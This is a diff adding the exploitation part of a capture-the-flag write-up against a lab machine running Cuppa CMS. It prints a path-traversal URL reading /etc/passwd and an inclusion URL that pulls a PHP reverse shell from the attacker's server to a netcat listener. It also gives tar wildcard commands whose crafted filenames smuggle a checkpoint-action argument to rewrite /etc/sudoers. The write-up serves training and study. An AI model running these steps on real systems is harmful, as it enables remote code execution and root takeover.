@@ -140,6 +140,68 @@ There doesn't seem to be anything important here. Lets run dirb to find any dire
 dirb http://10.10.209.119/45kra24zxs28v3yd/
 ```
 
+One of the directories that is found is /administrator.
+
 ![image](https://user-images.githubusercontent.com/115602464/195756685-5b5372c6-bf98-434e-bd5d-29e0c7cc4315.png)
 
+Visiting /administrator we see a cuppa CMS login. 
+
+# Exploitation
+
+Before trying to attack the login form, lets see if there is an exploit that exists for `Cuppa CMS`.
+
+![image](https://user-images.githubusercontent.com/115602464/195757669-54b67500-1807-4f4f-96f5-347a68db60ff.png)
+
+Reading the exploit page we can see that this isn't a python script. This is a remote file inclusion vulnerability. This exploit can be done through the URL.
+
+![image](https://user-images.githubusercontent.com/115602464/195758051-adf1f722-573c-40ee-b687-f8e3bc75619d.png)
+
+
+We can test this by running the command
+
+```
+http://10.10.209.119/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+```
+
+Since this works we can use the first example in the picture above to load up a php reverse shell.
+
+Lets download a php reverse shell and modify the IP to match our machine and the port to be 1337.
+
+We also need to start a python http server. We can do this with `python2 -m SimpleHTTPServer 4444`.
+
+Place the reverse shell in the directory where you ran your python server.
+
+Your reverse shell should look like this:
+
+![image](https://user-images.githubusercontent.com/115602464/195759360-550fbe15-c027-4f1a-a466-190a4cdf8920.png)
+
+Lets also host a listener on our attacker machine. This can be done with `nc -lvnp 1337`.
+
+At this point we should have a listener on port 1337 and our python server on port 4444.
+
+Now on the target machine we can access the revshell by going to our python server. Your IP will be different but it should look something like this:
+
+`http://10.10.209.119/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.100.47:4444/revshell.php`
+
+Check your listener and you should have a reverse shell!
+
+Lets look around a little bit. There is a milesdyson folder in the home directory.
+
+![image](https://user-images.githubusercontent.com/115602464/195760575-9c06e4d8-6219-4139-9acd-c3e972f93b7a.png)
+
+The user flag is inside user.txt.
+
+The backups folder contains a backup.sh file:
+
+![image](https://user-images.githubusercontent.com/115602464/195760730-62664aec-e164-4225-9be7-dccf7a976c8d.png)
+
+This shell script has a wildcard exploit. [More info here](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/)
+
+We can exploit this by changing into the /var/www/html directory and running:
+
+```
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
+echo "/var/www/html"  > --checkpoint=1
+```
 
